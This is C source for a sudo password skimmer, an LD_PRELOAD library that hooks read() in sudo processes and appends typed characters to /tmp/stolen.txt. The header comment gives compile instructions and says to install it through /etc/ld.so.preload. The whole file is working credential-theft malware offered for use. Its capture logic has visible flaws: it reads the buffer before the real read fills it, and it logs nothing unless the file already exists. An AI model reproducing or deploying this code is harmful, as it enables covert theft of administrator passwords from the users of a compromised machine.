/*
 * ld preload sudo pass skimmer
 *
 *                        -- oxagast / Marshall Whittaker --
 * marshall@oxasploits.com
 * https://oxasploits.com
 * Compile using: gcc -fPIC -shared -ldl -Wall sudo_lib_hook.c -o /tmp/cap_pass.so
 * Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need to do this as root).
 * Then sudo su. Log back out of the shell and check /tmp/stolen.txt.
 *
 * /tmp/stolen.txt should now contain the passphrase you entered.
 */

// immense thanks to vesteria for the general idea of skimming passwords!
// enrmous thanks to blissful boy for the file size func!
// gargantuan thanks to atdma for catching the lack of void* cast!
// and a collossal thanks to everyone who has found this useful!
// <3 you guys


#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/stat.h>

#define MAX_FILE_SIZE 200  // Stop writing after 200 bytes
#define MAX_PROCESS_NAME_LEN 256

// get file size in a robust way
long long getfsize(const char* fn) {
    struct stat st;
    if (stat(fn, &st) != 0) {
        return -1;
    }
    off_t fs = st.st_size;
    //printf("size: %ld", (long long)fs);
    return (long long)fs;

}

// pointer to real read func (needs to be PIC)
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

ssize_t read(int fd, void *buf, size_t count) {
    char process_name[MAX_PROCESS_NAME_LEN] = {0};
    if (original_read == NULL) {
        original_read = dlsym(RTLD_NEXT, "read");
        if (original_read == NULL) {
            fprintf(stderr, "Error: Could not find original read function.\n");
            return -1;
        }
    }

    // check if the current process is sudo
    FILE *fp_comm = fopen("/proc/self/comm", "r");
    if (fp_comm) {
        fgets(process_name, sizeof(process_name), fp_comm);
        process_name[strcspn(process_name, "\n")] = '\0';
        if (strcmp(process_name, "sudo") == 0) {

            long long fsz = getfsize("/tmp/stolen.txt");
            if (fsz < 0 || fsz >= MAX_FILE_SIZE) {
              fclose(fp_comm);
                return original_read(fd, buf, count);
            }
            FILE *stealer = fopen("/tmp/stolen.txt", "a");
            if (stealer) {
                if (count == 1) {
                    fprintf(stealer, "%.1s", (char*)buf);
                }
                fclose(stealer);
            }
        }
        fclose(fp_comm);
    } else {
        perror("Error opening /proc/self/comm");
    }
    return original_read(fd, buf, count);
}
